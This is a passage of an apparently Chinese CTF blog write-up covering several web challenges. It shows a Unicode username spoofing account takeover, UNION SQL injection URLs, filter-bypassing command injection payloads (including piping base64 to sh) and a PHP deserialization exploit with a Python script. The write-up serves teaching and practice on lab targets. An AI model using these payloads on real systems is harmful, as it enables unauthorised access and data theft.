class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure>
+
+<p>三者都包含strlower()方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strlower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)	<span class="comment">#突破点</span></span><br><span class="line">    <span class="keyword">return</span> usernamenode</span><br></pre></td></tr></table></figure>
+
+<p>此处的nodeprep.prepare()方法存在unicode欺骗漏洞，将修饰字符转换为大写字符，大写字符转换为小写字符</p>
+<p>也就有ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</p>
+<p>所以只需要完成两次转换就可以将用户名为ᴬᴰᴹᴵᴺ的账户转换为admin账户</p>
+<p>使用注册为ᴬᴰᴹᴵᴺ的账户登录，再修改密码，则被处理为admin账户修改密码，然后再登录admin</p>
+<p>获得flag；</p>
+<p>flag{b7342597-7fc6-4146-98ab-b4c1443ce753}</p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>按照常规步骤来，猜字段数：</p>
+<p>&#x2F;check.php?username&#x3D;admin%27%20order%20by%203%23&amp;password&#x3D;1</p>
+<p>&#x2F;check.php?username&#x3D;admin%27%20order%20by%204%23&amp;password&#x3D;1</p>
+<p><img src="/2020/07/26/week20200720-20200726/07/26/week20200720-20200726/image-20200727204609263.png" alt="image-20200727204609263"></p>
+<p>共三个字段，查询数据库和版本：</p>
+<p>&#x2F;check.php?username&#x3D;1’ union select 1,database(),version()%23&amp;password&#x3D;1</p>
+<p><img src="/2020/07/26/week20200720-20200726/07/26/week20200720-20200726/image-20200727204950937.png" alt="image-20200727204950937"></p>
+<p>爆表名：</p>
+<p>&#x2F;check.php?username&#x3D;1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23&amp;password&#x3D;1</p>
+<p><img src="/2020/07/26/week20200720-20200726/07/26/week20200720-20200726/image-20200727205104979.png" alt="image-20200727205104979"></p>
+<p>试一下，flag在</p>
+<p>&#x2F;check.php?username&#x3D;1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’l0ve1ysq1’%23&amp;password&#x3D;1</p>
+<p><img src="/2020/07/26/week20200720-20200726/07/26/week20200720-20200726/image-20200727205218835.png" alt="image-20200727205218835"></p>
+<p>&#x2F;check.php?username&#x3D;1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password&#x3D;1</p>
+<p>得到flag</p>
+<p>flag{8ba619ad-ff86-456c-9955-0054285ff898}</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ping一下</p>
+<p><img src="/2020/07/26/week20200720-20200726/image-20200727180048625.png" alt="image-20200727180048625"></p>
+<p>应该是命令执行获取flag，考察绕过过滤</p>
+<p>payload：<a target="_blank" rel="noopener" href="http://ee4788ec-e3b2-4db9-b9a7-619d14d8465c.node3.buuoj.cn/?ip=127.0.0.1%7Cls">http://ee4788ec-e3b2-4db9-b9a7-619d14d8465c.node3.buuoj.cn/?ip=127.0.0.1|ls</a></p>
+<p><img src="/2020/07/26/week20200720-20200726/07/26/week20200720-20200726/image-20200727180230984.png" alt="image-20200727180230984"></p>
+<p>payload：<a target="_blank" rel="noopener" href="http://ee4788ec-e3b2-4db9-b9a7-619d14d8465c.node3.buuoj.cn/?ip=127.0.0.1%7Ccat%20flag.php">http://ee4788ec-e3b2-4db9-b9a7-619d14d8465c.node3.buuoj.cn/?ip=127.0.0.1|cat%20flag.php</a></p>
+<p><img src="/2020/07/26/week20200720-20200726/image-20200727180403904.png" alt="image-20200727180403904"></p>
+<p>空格是被过滤了的，那先绕过空格过滤查看一下index.php</p>
+<p>payload：?ip&#x3D;127.0.0.1;cat$IFS$1index.php</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>flag也是过滤目标，bash过滤，可以使用sh</p>
+<p>payload：?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<br>(cat flag.php)<br>查看源代码可得flag</p>
+<p>或者payload：?ip&#x3D;127.0.0.1;cat$IFS$1<code>ls</code></p>
+<blockquote>
+<p>方法名叫内联执行<br>方法:将反引号内命令的输出作为输入执行</p>
+</blockquote>
+<p>flag{8f4cba81-d281-497f-a4c0-5ba185fd0a49}</p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="/2020/07/26/week20200720-20200726/image-20200727161336050.png" alt="image-20200727161336050"></p>
+<p>文件有备份，直接扫描目录，发现有<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="/2020/07/26/week20200720-20200726/image-20200727154736861.png" alt="image-20200727154736861"></p>
+<p>解压有以下文件：</p>
+<p><img src="/2020/07/26/week20200720-20200726/image-20200727161730674.png" alt="image-20200727161730674"></p>
+<p>flag.php里有个flag，但是是错的</p>
+<p>index.php，这里进行了序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>考点是反序列化漏洞 <a target="_blank" rel="noopener" href="https://paper.seebug.org/866/">https://paper.seebug.org/866/</a></p>
+<p>当一个类被初始化为实例时会调用__construct，当被销毁时会调用__destruct。</p>
+<p>当一个类调用serialize进行序列化时会自动调用__sleep函数，当字符串要利用unserialize反序列化成一个类时会调用__wakeup函数</p>
+<p>序列化特征：</p>
+<blockquote>
+<p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p>
+</blockquote>
+<blockquote>
+<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p>
+</blockquote>
+<p>构造<br>O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}<br>这里将属性个数2改为3，可以达到绕过__wakeup函数的目的</p>
+<p>所以O:4:”Name”:3:{s:14:”\0Name\0username”;s:5:”admin”;s:14:”\0Name\0password”;i:100;}</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot; &quot;</span> <span class="comment">#target</span></span><br><span class="line">html = requests.get(url+<span class="string">&#x27;?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(html.text)</span><br></pre></td></tr></table></figure>
+<p>运行找到了flag{fbaad1fb-28a3-4e65-9db6-412826fedb00}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://du11jk.github.io">Du11jk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://du11jk.github.io/2020/07/26/week20200720-20200726/">http://du11jk.github.io/2020/07/26/week20200720-20200726/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">CTF - Web</a></div><div class="post_share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/48244012?v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/07/28/week20200727-20200802/" title="week20200727-20200802"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">week20200727-20200802</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/23/week20200713-20200719/" title="week20200713-20200719"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">week20200713-20200719</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/07/29/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-29</div><div class="title">SQL注入总结</div></div></a></div><div><a href="/2020/07/23/week20200713-20200719/" title="week20200713-20200719"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-23</div><div class="title">week20200713-20200719</div></div></a></div><div><a href="/2020/07/28/week20200727-20200802/" title="week20200727-20200802"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-28</div><div class="title">week20200727-20200802</div></div></a></div><div><a href="/2020/08/06/week20200803-20200809/" title="week20200803-20200809"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-06</div><div class="title">week20200803-20200809</div></div></a></div><div><a href="/2020/09/10/week20200831-20200906/" title="week20200831-20200906"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-10</div><div class="title">week20200831-20200906</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/48244012?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Du11jk</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Du11JK"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/du11jk" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="Rss"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Email uncracka61e@gmail.com</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Week-2-lt-2020-07-20-2020-07-26-gt"><span class="toc-number">1.</span> <span class="toc-text">Week 2 &lt;2020.07.20 - 2020.07.26&gt;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">1.2.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">1.3.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">1.4.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">1.5.</span> <span class="toc-text">[HCTF 2018]admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-session-%E4%BC%AA%E9%80%A0%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">flask session 伪造：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E6%AC%BA%E9%AA%97%EF%BC%9A"><span class="toc-number">1.5.2.</span> <span class="toc-text">unicode欺骗：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">1.6.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.7.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">1.8.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/01/Deep%20Learning%20with%20Differential%20Privacy%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/" title="Deep Learning with Differential Privacy 阅读记录">Deep Learning with Differential Privacy 阅读记录</a><time datetime="2021-04-01T02:00:00.000Z" title="Created 2021-04-01 10:00:00">2021-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2020/11/18/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AE%9E%E7%8E%B0/" title="利用SEH链的反调试">利用SEH链的反调试</a><time datetime="2020-11-18T14:55:55.000Z" title="Created 2020-11-18 22:55:55">2020-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2020/11/06/PE%E6%89%8B%E5%B7%A5%E5%8A%A0%E5%A3%B3%E5%AE%9E%E4%BE%8B/" title="PE手工加壳实例">PE手工加壳实例</a><time datetime="2020-11-06T09:02:15.000Z" title="Created 2020-11-06 17:02:15">2020-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2020/09/13/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/" title="RSA算法原理">RSA算法原理</a><time datetime="2020-09-12T18:14:21.000Z" title="Created 2020-09-13 02:14:21">2020-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2020/09/13/OLLVM-%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/" title="OLLVM 控制流平坦化">OLLVM 控制流平坦化</a><time datetime="2020-09-12T17:06:38.000Z" title="Created 2020-09-13 01:06:38">2020-09-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Du11jk</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></body></html>
